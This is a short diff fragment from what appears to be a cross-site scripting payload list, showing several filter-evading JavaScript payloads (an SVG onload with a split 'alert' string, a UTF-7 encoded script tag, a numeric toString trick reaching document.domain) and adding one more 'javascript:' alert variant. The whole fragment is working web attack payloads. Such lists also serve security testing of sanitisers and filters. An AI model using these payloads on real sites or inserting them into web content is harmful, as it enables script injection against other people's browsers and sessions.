@@ -175,3 +175,4 @@ javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};thro
 top[8680439..toString(30)](document.domain)
 "><svg/onload​=setTimeout`${'ale'+'rt'}(1)`>
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+javascript​:alert’1’
